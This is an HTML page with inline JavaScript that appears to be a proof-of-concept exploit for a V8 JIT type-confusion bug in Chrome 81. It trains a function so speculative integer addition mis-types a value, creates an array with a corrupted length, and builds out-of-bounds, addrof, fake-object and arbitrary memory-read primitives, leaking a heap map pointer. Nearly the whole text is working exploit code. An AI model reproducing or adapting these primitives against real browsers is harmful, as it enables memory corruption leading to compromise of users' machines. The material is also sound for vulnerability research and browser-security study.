<pre id="log"></pre>
<script>
// chrome 81

let ab = new ArrayBuffer(0x8);
let bab = new BigUint64Array(ab);
let uab = new Uint32Array(ab);
let fab = new Float64Array(ab);

function itof(_int) {
    bab[0] = _int
    return fab[0]
}

function ftoi(_float) {
    fab[0] = _float
    return bab[0]
}

function i32tof(_low, _up) {
    uab[0] = _low
    uab[1] = _up
    return fab[0]
}

function f32toi(_float) {
    fab[0] = _float
    return [uab[0], uab[1]]
}

function print(str) {
    console.log(str);
    var log = document.getElementById('log');
    if (log) {
        log.innerText += str + '\n';
    }
}

var bs = new ArrayBuffer(8);
var fs = new Float64Array(bs);
var is = new BigUint64Array(bs);

function ftoi(val) {
  fs[0] = val;
  return is[0];
}

function itof(val) {
  is[0] = val;
  return fs[0];
}

function foo(a) {
	let y = 0x7fffffff;

	/* 
	Make sure we fail the first 'if' statement inside 
	'VisitSpeculativeIntegerAdditiveOp'
	*/
	if (a == NaN) y = NaN;

	// Gather type feedback 
	if (a) y = -1;

	let z = (y + 1) | 0;
	
	z = (z == 0x80000000) | 0;
	if (a == 'wellooo') z = -1;

	// [3]
	let arr = new Array(z);
	arr.shift();
	let second = [1.1, 1.1, 1.1];
    let fakeObject = [2.2, 1.1];
	
	return [arr, second, fakeObject];
}

for (let i = 0; i < 20000; i++) {
	foo(true);
}

const ret_value = foo(false);
var oob = ret_value[0];
var control = ret_value[1];
var fakeObject = ret_value[2];
oob[16] = 0x4141;

print(`[.] ${oob.length.toString(16)}`)
print(`[.] ${control.length.toString(16)}`)

function addrof(obj) {
	oob[9] = obj;
	const addr = ftoi(control[1]);
	control[1] = 1.1;
	return addr & 0xffffffffn;
}

let float_map_properties = ftoi(control[3]);
print(`[+] leaked float map: 0x${float_map_properties.toString(16)}`);

// for (let i = 0; i < 20 ; i += 1) {
//     print(`${i} ${ftoi(control[i]).toString(16)}`)
// }
// let [_low, _high] = f32toi(control[9])
// control[9] = i32tof(_low, 0x30)
// print(fakeObject.length.toString(16))

function sandboxRead(address) {
    let [_low, _high] = f32toi(control[9])
    control[9] = i32tof(Number(address)-0x8, 0x30)
    return ftoi(fakeObject[0])
}

test = {};
%DebugPrint(test);
testAddr = addrof(test);
testRead = sandboxRead(testAddr);
print(testRead.toString(16))

while (true) {}

</script>